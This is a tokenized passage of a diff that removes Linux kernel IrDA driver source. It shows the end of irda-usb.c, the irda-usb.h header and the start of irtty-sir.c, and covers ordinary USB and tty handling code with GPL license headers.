"(", "self", "-", ">", "netdev", ")", ";*", "/", "netif_stop_queue", "(", "self", "-", ">", "netdev", ")", ";", "/", "*", "Stop", "all", "the", "receive", "URBs", ".", "Must", "be", "synchronous", ".", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "usb_kill_urb", "(", "self", "-", ">", "rx_urb", "[", "i", "]", ");", "/", "*", "Cancel", "Tx", "and", "speed", "URB", ".", "*", "Make", "sure", "it", "'", "s", "synchronous", "to", "avoid", "races", ".", "*", "/", "usb_kill_urb", "(", "self", "-", ">", "tx_urb", ")", ";", "usb_kill_urb", "(", "self", "-", ">", "speed_urb", ")", ";", "}", "/", "*", "Cleanup", "the", "device", "stuff", "*", "/", "irda_usb_close", "(", "self", ")", ";", "/", "*", "No", "longer", "attached", "to", "USB", "bus", "*", "/", "self", "-", ">", "usbdev", "=", "NULL", ";", "self", "-", ">", "usbintf", "=", "NULL", ";", "/", "*", "Clean", "up", "our", "urbs", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "usb_free_urb", "(", "self", "-", ">", "rx_urb", "[", "i", "]", ");", "kfree", "(", "self", "-", ">", "rx_urb", ")", ";", "/", "*", "Clean", "up", "Tx", "and", "speed", "URB", "*", "/", "usb_free_urb", "(", "self", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "self", "-", ">", "speed_urb", ")", ";", "/", "*", "Free", "self", "and", "network", "device", "*", "/", "free_netdev", "(", "self", "-", ">", "netdev", ")", ";", "pr_debug", "(", "\"%", "s", "(", "),", "USB", "IrDA", "Disconnected", "\\", "n", "\"", ",", "__func__", ")", ";", "}", "#", "ifdef", "CONFIG_PM", "/", "*", "USB", "suspend", ",", "so", "power", "off", "the", "transmitter", "/", "receiver", "*", "/", "static", "int", "irda_usb_suspend", "(", "struct", "usb_interface", "*", "intf", ",", "pm_message_t", "message", ")", "{", "struct", "irda_usb_cb", "*", "self", "=", "usb_get_intfdata", "(", "intf", ")", ";", "int", "i", ";", "netif_device_detach", "(", "self", "-", ">", "netdev", ")", ";", "if", "(", "self", "-", ">", "tx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "self", "-", ">", "tx_urb", ")", ";", "if", "(", "self", "-", ">", "speed_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "self", "-", ">", "speed_urb", ")", ";", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "{", "if", "(", "self", "-", ">", "rx_urb", "[", "i", "]", "!", "=", "NULL", ")", "usb_kill_urb", "(", "self", "-", ">", "rx_urb", "[", "i", "]", ");", "}", "return", "0", ";", "}", "/", "*", "Coming", "out", "of", "suspend", ",", "so", "reset", "hardware", "*", "/", "static", "int", "irda_usb_resume", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "irda_usb_cb", "*", "self", "=", "usb_get_intfdata", "(", "intf", ")", ";", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "self", "-", ">", "max_rx_urb", ";", "i", "+", "+)", "{", "if", "(", "self", "-", ">", "rx_urb", "[", "i", "]", "!", "=", "NULL", ")", "usb_submit_urb", "(", "self", "-", ">", "rx_urb", "[", "i", "]", ",", "GFP_KERNEL", ")", ";", "}", "netif_device_attach", "(", "self", "-", ">", "netdev", ")", ";", "return", "0", ";", "}", "#", "endif", "/", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "/", "/", "*", "*", "USB", "device", "callbacks", "*", "/", "static", "struct", "usb_driver", "irda_driver", "=", "{", ".", "name", "=", "\"", "irda", "-", "usb", "\"", ",", ".", "probe", "=", "irda_usb_probe", ",", ".", "disconnect", "=", "irda_usb_disconnect", ",", ".", "id_table", "=", "dongles", ",", "#", "ifdef", "CONFIG_PM", ".", "suspend", "=", "irda_usb_suspend", ",", ".", "resume", "=", "irda_usb_resume", ",", "#", "endif", "}", ";", "module_usb_driver", "(", "irda_driver", ")", ";", "/", "*", "*", "Module", "parameters", "*", "/", "module_param", "(", "qos_mtt_bits", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "qos_mtt_bits", ",", "\"", "Minimum", "Turn", "Time", "\"", ");", "MODULE_AUTHOR", "(", "\"", "Roman", "Weissgaerber", "<", "weissg", "@", "vienna", ".", "at", ">", ",", "Dag", "Brattli", "<", "dag", "@", "brattli", ".", "net", ">", ",", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "and", "Nick", "Fedchik", "<", "nick", "@", "fedchik", ".", "org", ".", "ua", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "IrDA", "-", "USB", "Dongle", "Driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "175", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "irda", "-", "usb", ".", "h", "*", "Version", ":", "0", ".", "10", "*", "Description", ":", "IrDA", "-", "USB", "Driver", "*", "Status", ":", "Experimental", "*", "Author", ":", "Dag", "Brattli", "<", "dag", "@", "brattli", ".", "net", ">", "*", "*", "Copyright", "(", "C", ")", "2001", ",", "Roman", "Weissgaerber", "<", "weissg", "@", "vienna", ".", "at", ">", "*", "Copyright", "(", "C", ")", "2000", ",", "Dag", "Brattli", "<", "dag", "@", "brattli", ".", "net", ">", "*", "Copyright", "(", "C", ")", "2001", ",", "Jean", "Tourrilhes", "<", "jt", "@", "hpl", ".", "hp", ".", "com", ">", "*", "Copyright", "(", "C", ")", "2004", ",", "SigmaTel", ",", "Inc", ".", "<", "irquality", "@", "sigmatel", ".", "com", ">", "*", "Copyright", "(", "C", ")", "2005", ",", "Milan", "Beno", "<", "beno", "@", "pobox", ".", "sk", ">", "*", "Copyright", "(", "C", ")", "2006", ",", "Nick", "FEdchik", "<", "nick", "@", "fedchik", ".", "org", ".", "ua", ">", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "*", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "#", "include", "<", "linux", "/", "ktime", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "/", "*", "struct", "irlap_cb", "*", "/", "#", "define", "RX_COPY_THRESHOLD", "200", "#", "define", "IRDA_USB_MAX_MTU", "2051", "#", "define", "IRDA_USB_SPEED_MTU", "64", "/", "*", "Weird", ",", "but", "work", "like", "this", "*", "/", "/", "*", "Maximum", "number", "of", "active", "URB", "on", "the", "Rx", "path", "*", "This", "is", "the", "amount", "of", "buffers", "the", "we", "keep", "between", "the", "USB", "harware", "and", "the", "*", "IrDA", "stack", ".", "*", "*", "Note", ":", "the", "network", "layer", "does", "also", "queue", "the", "packets", "between", "us", "and", "the", "*", "IrDA", "stack", ",", "and", "is", "actually", "pretty", "fast", "and", "efficient", "in", "doing", "that", ".", "*", "Therefore", ",", "we", "don", "'", "t", "need", "to", "have", "a", "large", "number", "of", "URBs", ",", "and", "we", "can", "*", "perfectly", "live", "happy", "with", "only", "one", ".", "We", "certainly", "don", "'", "t", "need", "to", "keep", "the", "*", "full", "IrTTP", "window", "around", "here", ".", "..", "*", "I", "repeat", "for", "those", "who", "have", "trouble", "to", "understand", ":", "1", "URB", "is", "plenty", "*", "good", "enough", "to", "handle", "back", "-", "to", "-", "back", "(", "brickwalled", ")", "frames", ".", "I", "tried", "it", ",", "*", "it", "works", "(", "it", "'", "s", "the", "hardware", "that", "has", "trouble", "doing", "it", ")", ".", "*", "*", "Having", "2", "URBs", "would", "allow", "the", "USB", "stack", "to", "process", "one", "URB", "while", "we", "take", "*", "care", "of", "the", "other", "and", "then", "swap", "the", "URBs", ".", "..", "*", "On", "the", "other", "hand", ",", "increasing", "the", "number", "of", "URB", "will", "have", "penalities", "*", "in", "term", "of", "latency", "and", "will", "interact", "with", "the", "link", "management", "in", "IrLAP", ".", "..", "*", "Jean", "II", "*", "/", "#", "define", "IU_MAX_ACTIVE_RX_URBS", "1", "/", "*", "Don", "'", "t", "touch", "!", "!!", "*", "/", "/", "*", "When", "a", "Rx", "URB", "is", "passed", "back", "to", "us", ",", "we", "can", "'", "t", "reuse", "it", "immediately", ",", "*", "because", "it", "may", "still", "be", "referenced", "by", "the", "USB", "layer", ".", "Therefore", "we", "*", "need", "to", "keep", "one", "extra", "URB", "in", "the", "Rx", "path", ".", "*", "Jean", "II", "*", "/", "#", "define", "IU_MAX_RX_URBS", "(", "IU_MAX_ACTIVE_RX_URBS", "+", "1", ")", "/", "*", "Various", "ugly", "stuff", "to", "try", "to", "workaround", "generic", "problems", "*", "/", "/", "*", "Send", "speed", "command", "in", "case", "of", "timeout", ",", "just", "for", "trying", "to", "get", "things", "sane", "*", "/", "#", "define", "IU_BUG_KICK_TIMEOUT", "/", "*", "Show", "the", "USB", "class", "descriptor", "*", "/", "#", "undef", "IU_DUMP_CLASS_DESC", "/", "*", "Assume", "a", "minimum", "round", "trip", "latency", "for", "USB", "transfer", "(", "in", "us", ")", "..", ".", "*", "USB", "transfer", "are", "done", "in", "the", "next", "USB", "slot", "if", "there", "is", "no", "traffic", "*", "(", "1", "/", "19", "msec", ")", "and", "is", "done", "at", "12", "Mb", "/", "s", ":", "*", "Waiting", "for", "slot", "+", "tx", "=", "(", "53us", "+", "16us", ")", "*", "2", "=", "137us", "minimum", ".", "*", "Rx", "notification", "will", "only", "be", "done", "at", "the", "end", "of", "the", "USB", "frame", "period", ":", "*", "OHCI", ":", "frame", "period", "=", "1ms", "*", "UHCI", ":", "frame", "period", "=", "1ms", ",", "but", "notification", "can", "take", "2", "or", "3", "ms", ":", "-(", "*", "EHCI", ":", "frame", "period", "=", "125us", "*", "/", "#", "define", "IU_USB_MIN_RTT", "500", "/", "*", "This", "should", "be", "safe", "in", "most", "cases", "*", "/", "/", "*", "Inbound", "header", "*", "/", "#", "define", "MEDIA_BUSY", "0x80", "#", "define", "SPEED_2400", "0x01", "#", "define", "SPEED_9600", "0x02", "#", "define", "SPEED_19200", "0x03", "#", "define", "SPEED_38400", "0x04", "#", "define", "SPEED_57600", "0x05", "#", "define", "SPEED_115200", "0x06", "#", "define", "SPEED_576000", "0x07", "#", "define", "SPEED_1152000", "0x08", "#", "define", "SPEED_4000000", "0x09", "#", "define", "SPEED_16000000", "0x0a", "/", "*", "Basic", "capabilities", "*", "/", "#", "define", "IUC_DEFAULT", "0x00", "/", "*", "Basic", "device", "compliant", "with", "1", ".", "0", "spec", "*", "/", "/", "*", "Main", "bugs", "*", "/", "#", "define", "IUC_SPEED_BUG", "0x01", "/", "*", "Device", "doesn", "'", "t", "set", "speed", "after", "the", "frame", "*", "/", "#", "define", "IUC_NO_WINDOW", "0x02", "/", "*", "Device", "doesn", "'", "t", "behave", "with", "big", "Rx", "window", "*", "/", "#", "define", "IUC_NO_TURN", "0x04", "/", "*", "Device", "doesn", "'", "t", "do", "turnaround", "by", "itself", "*", "/", "/", "*", "Not", "currently", "used", "*", "/", "#", "define", "IUC_SIR_ONLY", "0x08", "/", "*", "Device", "doesn", "'", "t", "behave", "at", "FIR", "speeds", "*", "/", "#", "define", "IUC_SMALL_PKT", "0x10", "/", "*", "Device", "doesn", "'", "t", "behave", "with", "big", "Rx", "packets", "*", "/", "#", "define", "IUC_MAX_WINDOW", "0x20", "/", "*", "Device", "underestimate", "the", "Rx", "window", "*", "/", "#", "define", "IUC_MAX_XBOFS", "0x40", "/", "*", "Device", "need", "more", "xbofs", "than", "advertised", "*", "/", "#", "define", "IUC_STIR421X", "0x80", "/", "*", "SigmaTel", "4210", "/", "4220", "/", "4116", "VFIR", "*", "/", "/", "*", "USB", "class", "definitions", "*", "/", "#", "define", "USB_IRDA_HEADER", "0x01", "#", "define", "USB_CLASS_IRDA", "0x02", "/", "*", "USB_CLASS_APP_SPEC", "subclass", "*", "/", "#", "define", "USB_DT_IRDA", "0x21", "#", "define", "USB_IRDA_STIR421X_HEADER", "0x03", "#", "define", "IU_SIGMATEL_MAX_RX_URBS", "(", "IU_MAX_ACTIVE_RX_URBS", "+", "\\", "USB_IRDA_STIR421X_HEADER", ")", "struct", "irda_class_desc", "{", "__u8", "bLength", ";", "__u8", "bDescriptorType", ";", "__le16", "bcdSpecRevision", ";", "__u8", "bmDataSize", ";", "__u8", "bmWindowSize", ";", "__u8", "bmMinTurnaroundTime", ";", "__le16", "wBaudRate", ";", "__u8", "bmAdditionalBOFs", ";", "__u8", "bIrdaRateSniff", ";", "__u8", "bMaxUnicastList", ";", "}", "__packed", ";", "/", "*", "class", "specific", "interface", "request", "to", "get", "the", "IrDA", "-", "USB", "class", "descriptor", "*", "(", "6", ".", "2", ".", "5", ",", "USB", "-", "IrDA", "class", "spec", "1", ".", "0", ")", "*", "/", "#", "define", "IU_REQ_GET_CLASS_DESC", "0x06", "#", "define", "STIR421X_MAX_PATCH_DOWNLOAD_SIZE", "1023", "struct", "irda_usb_cb", "{", "struct", "irda_class_desc", "*", "irda_desc", ";", "struct", "usb_device", "*", "usbdev", ";", "/", "*", "init", ":", "probe_irda", "*", "/", "struct", "usb_interface", "*", "usbintf", ";", "/", "*", "init", ":", "probe_irda", "*", "/", "int", "netopen", ";", "/", "*", "Device", "is", "active", "for", "network", "*", "/", "int", "present", ";", "/", "*", "Device", "is", "present", "on", "the", "bus", "*", "/", "__u32", "capability", ";", "/", "*", "Capability", "of", "the", "hardware", "*", "/", "__u8", "bulk_in_ep", ";", "/", "*", "Rx", "Endpoint", "assignments", "*", "/", "__u8", "bulk_out_ep", ";", "/", "*", "Tx", "Endpoint", "assignments", "*", "/", "__u16", "bulk_out_mtu", ";", "/", "*", "Max", "Tx", "packet", "size", "in", "bytes", "*", "/", "__u8", "bulk_int_ep", ";", "/", "*", "Interrupt", "Endpoint", "assignments", "*", "/", "__u8", "max_rx_urb", ";", "struct", "urb", "*", "*", "rx_urb", ";", "/", "*", "URBs", "used", "to", "receive", "data", "frames", "*", "/", "struct", "urb", "*", "idle_rx_urb", ";", "/", "*", "Pointer", "to", "idle", "URB", "in", "Rx", "path", "*", "/", "struct", "urb", "*", "tx_urb", ";", "/", "*", "URB", "used", "to", "send", "data", "frames", "*", "/", "struct", "urb", "*", "speed_urb", ";", "/", "*", "URB", "used", "to", "send", "speed", "commands", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "Yes", "!", "we", "are", "some", "kind", "of", "netdev", ".", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "char", "*", "speed_buff", ";", "/", "*", "Buffer", "for", "speed", "changes", "*", "/", "char", "*", "tx_buff", ";", "ktime_t", "stamp", ";", "spinlock_t", "lock", ";", "/", "*", "For", "serializing", "Tx", "operations", "*", "/", "__u16", "xbofs", ";", "/", "*", "Current", "xbofs", "setting", "*", "/", "__s16", "new_xbofs", ";", "/", "*", "xbofs", "we", "need", "to", "set", "*", "/", "__u32", "speed", ";", "/", "*", "Current", "speed", "*", "/", "__s32", "new_speed", ";", "/", "*", "speed", "we", "need", "to", "set", "*", "/", "__u8", "header_length", ";", "/", "*", "USB", "-", "IrDA", "frame", "header", "size", "*", "/", "int", "needspatch", ";", "/", "*", "device", "needs", "firmware", "patch", "*", "/", "struct", "timer_list", "rx_defer_timer", ";", "/", "*", "Wait", "for", "Rx", "error", "to", "clear", "*", "/", "struct", "urb", "*", "rx_defer_timer_urb", ";", "/", "*", "URB", "attached", "to", "rx_defer_timer", "*", "/", "}", ";", "@", "@", "-", "1", ",", "570", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "irtty", "-", "sir", ".", "c", "*", "Version", ":", "2", ".", "0", "*", "Description", ":", "IrDA", "line", "discipline", "implementation", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "Created", "at", ":", "Tue", "Dec", "9", "21", ":", "18", ":", "38", "1997", "*", "Modified", "at", ":", "Sun", "Oct", "27", "22", ":", "13", ":", "30", "2002", "*", "Modified", "by", ":", "Martin", "Diehl", "<", "mad", "@", "mdiehl", ".", "de", ">", "*", "Sources", ":", "slip", ".", "c", "by", "Laurence", "Culhane", ",", "<", "loz", "@", "holmes", ".", "demon", ".", "co", ".", "uk", ">", "*", "Fred", "N", ".", "van", "Kempen", ",", "<", "waltje", "@", "uwalt", ".", "nl", ".", "mugnet", ".", "org", ">", "*", "*", "Copyright", "(", "c", ")", "1998", "-", "2000", "Dag", "Brattli", ",", "*", "Copyright", "(", "c", ")", "2002", "Martin", "Diehl", ",", "*", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "Neither", "Dag", "Brattli", "nor", "University", "of", "Troms", "\u00f8", "admit", "liability", "nor", "*", "provide", "warranty", "for", "any", "of", "this", "software", ".", "This", "material", "is", "*", "provided", "\"", "AS", "-", "IS", "\"", "and", "at", "no", "charge", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "tty", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "mutex", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "#", "include", "\"", "irtty", "-", "sir", ".", "h", "\"", "static", "int", "qos_mtt_bits", "=", "0x03", ";", "/", "*", "5", "ms", "or", "more", "*", "/", "module_param", "(", "qos_mtt_bits", ",", "int", ",", "0", ")", ";", "MODULE_PARM_DESC", "(", "qos_mtt_bits", ",", "\"", "Minimum", "Turn", "Time", "\"", ");", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "/", "*", "device", "configuration", "callbacks", "always", "invoked", "with", "irda", "-", "thread", "context", "*", "/", "/", "*", "find", "out", ",", "how", "many", "chars", "we", "have", "in", "buffers", "below", "us", "*", "this", "is", "allowed", "to", "lie", ",", "i", ".", "e", ".", "return", "less", "chars", "than", "we", "*", "actually", "have", ".", "The", "returned", "value", "is", "used", "to", "determine", "*", "how", "long", "the", "irdathread", "should", "wait", "before", "doing", "the", "*", "real", "blocking", "wait_until_sent", "(", ")", "*", "/", "static", "int", "irtty_chars_in_buffer", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "dev", "-", ">", "priv", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", "-", "1", ";", ");", "return", "tty_chars_in_buffer", "(", "priv", "-", ">", "tty", ")", ";", "}", "/", "*", "Wait", "(", "sleep", ")", "until", "underlaying", "hardware", "finished", "transmission", "*", "i", ".", "e", ".", "hardware", "buffers", "are", "drained", "*", "this", "must", "block", "and", "not", "return", "before", "all", "characters", "are", "really", "sent", "*", "*", "If", "the", "tty", "sits", "on", "top", "of", "a", "16550A", "-", "like", "uart", ",", "there", "are", "typically", "*", "up", "to", "16", "bytes", "in", "the", "fifo", "-", "f", ".", "e", ".", "9600", "bps", "8N1", "needs", "16", ".", "7", "msec", "*", "*", "With", "usbserial", "the", "uart", "-", "fifo", "is", "basically", "replaced", "by", "the", "converter", "'", "s", "*", "outgoing", "endpoint", "buffer", ",", "which", "can", "usually", "hold", "64", "bytes", "(", "at", "least", ")", ".", "*", "With", "pl2303", "it", "appears", "we", "are", "safe", "with", "60msec", "here", ".", "*", "*", "I", "really", "wish", "all", "serial", "drivers", "would", "provide", "*", "correct", "implementation", "of", "wait_until_sent", "(", ")", "*", "/", "#", "define", "USBSERIAL_TX_DONE_DELAY", "60", "static", "void", "irtty_wait_until_sent", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "dev", "-", ">", "priv", ";", "struct", "tty_struct", "*", "tty", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", ";", ");", "tty", "=", "priv", "-", ">", "tty", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "wait_until_sent", ")", "{", "tty", "-", ">", "ops", "-", ">", "wait_until_sent", "(", "tty", ",", "msecs_to_jiffies", "(", "100", ")", ");", "}", "else", "{", "msleep", "(", "USBSERIAL_TX_DONE_DELAY", ")", ";", "}", "}", "/", "*", "*", "Function", "irtty_change_speed", "(", "dev", ",", "speed", ")", "*", "*", "Change", "the", "speed", "of", "the", "serial", "port", ".", "*", "*", "This", "may", "sleep", "in", "set_termios", "(", "usbserial", "driver", "f", ".", "e", ".", ")", "and", "must", "*", "not", "be", "called", "from", "interrupt", "/", "timer", "/", "tasklet", "therefore", ".", "*", "All", "such", "invocations", "are", "deferred", "to", "kIrDAd", "now", "so", "we", "can", "sleep", "there", ".", "*", "/", "static", "int", "irtty_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "dev", "-", ">", "priv", ";", "struct", "tty_struct", "*", "tty", ";", "struct", "ktermios", "old_termios", ";", "int", "cflag", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", "-", "1", ";", ");", "tty", "=", "priv", "-", ">", "tty", ";", "down_write", "(", "&", "tty", "-", ">", "termios_rwsem", ")", ";", "old_termios", "=", "tty", "-", ">", "termios", ";", "cflag", "=", "tty", "-", ">", "termios", ".", "c_cflag", ";", "tty_encode_baud_rate", "(", "tty", ",", "speed", ",", "speed", ")", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "set_termios", ")", "tty", "-", ">", "ops", "-", ">", "set_termios", "(", "tty", ",", "&", "old_termios", ")", ";", "priv", "-", ">", "io", ".", "speed", "=", "speed", ";", "up_write", "(", "&", "tty", "-", ">", "termios_rwsem", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "irtty_set_dtr_rts", "(", "dev", ",", "dtr", ",", "rts", ")", "*", "*", "This", "function", "can", "be", "used", "by", "dongles", "etc", ".", "to", "set", "or", "reset", "the", "status", "*", "of", "the", "dtr", "and", "rts", "lines", "*", "/", "static", "int", "irtty_set_dtr_rts", "(", "struct", "sir_dev", "*", "dev", ",", "int", "dtr", ",", "int", "rts", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "dev", "-", ">", "priv", ";", "int", "set", "=", "0", ";", "int", "clear", "=", "0", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", "-", "1", ";", ");", "if", "(", "rts", ")", "set", "|", "=", "TIOCM_RTS", ";", "else", "clear", "|", "=", "TIOCM_RTS", ";", "if", "(", "dtr", ")", "set", "|", "=", "TIOCM_DTR", ";", "else", "clear", "|", "=", "TIOCM_DTR", ";", "/", "*", "*", "We", "can", "'", "t", "use", "ioctl", "(", ")", "because", "it", "expects", "a", "non", "-", "null", "file", "structure", ",", "*", "and", "we", "don", "'", "t", "have", "that", "here", ".", "*", "This", "function", "is", "not", "yet", "defined", "for", "all", "tty", "driver", ",", "so", "*", "let", "'", "s", "be", "careful", ".", "..", "Jean", "II", "*", "/", "IRDA_ASSERT", "(", "priv", "-", ">", "tty", "-", ">", "ops", "-", ">", "tiocmset", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "priv", "-", ">", "tty", "-", ">", "ops", "-", ">", "tiocmset", "(", "priv", "-", ">", "tty", ",", "set", ",", "clear", ")", ";", "return", "0", ";", "}", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "/", "*", "called", "from", "sir_dev", "when", "there", "is", "more", "data", "to", "send", "*", "context", "is", "either", "netdev", "-", ">", "hard_xmit", "or", "some", "transmit", "-", "completion", "bh", "*", "i", ".", "e", ".", "we", "are", "under", "spinlock", "here", "and", "must", "not", "sleep", ".", "*", "/", "static", "int", "irtty_do_write", "(", "struct", "sir_dev", "*", "dev", ",", "const", "unsigned", "char", "*", "ptr", ",", "size_t", "len", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "dev", "-", ">", "priv", ";", "struct", "tty_struct", "*", "tty", ";", "int", "writelen", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", "-", "1", ";", ");", "tty", "=", "priv", "-", ">", "tty", ";", "if", "(", "!", "tty", "-", ">", "ops", "-", ">", "write", ")", "return", "0", ";", "set_bit", "(", "TTY_DO_WRITE_WAKEUP", ",", "&", "tty", "-", ">", "flags", ")", ";", "writelen", "=", "tty_write_room", "(", "tty", ")", ";", "if", "(", "writelen", ">", "len", ")", "writelen", "=", "len", ";", "return", "tty", "-", ">", "ops", "-", ">", "write", "(", "tty", ",", "ptr", ",", "writelen", ")", ";", "}", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "/", "*", "irda", "line", "discipline", "callbacks", "*", "/", "/", "*", "*", "Function", "irtty_receive_buf", "(", "tty", ",", "cp", ",", "count", ")", "*", "*", "Handle", "the", "'", "receiver", "data", "ready", "'", "interrupt", ".", "This", "function", "is", "called", "*", "by", "the", "'", "tty_io", "'", "module", "in", "the", "kernel", "when", "a", "block", "of", "IrDA", "data", "has", "*", "been", "received", ",", "which", "can", "now", "be", "decapsulated", "and", "delivered", "for", "*", "further", "processing", "*", "*", "calling", "context", "depends", "on", "underlying", "driver", "and", "tty", "-", ">", "port", "-", ">", "low_latency", "!", "*", "for", "example", "(", "low_latency", ":", "1", "/", "0", ")", ":", "*", "serial", ".", "c", ":", "uart", "-", "interrupt", "/", "softint", "*", "usbserial", ":", "urb", "-", "complete", "-", "interrupt", "/", "softint", "*", "/", "static", "void", "irtty_receive_buf", "(", "struct", "tty_struct", "*", "tty", ",", "const", "unsigned", "char", "*", "cp", ",", "char", "*", "fp", ",", "int", "count", ")", "{", "struct", "sir_dev", "*", "dev", ";", "struct", "sirtty_cb", "*", "priv", "=", "tty", "-", ">", "disc_data", ";", "int", "i", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", 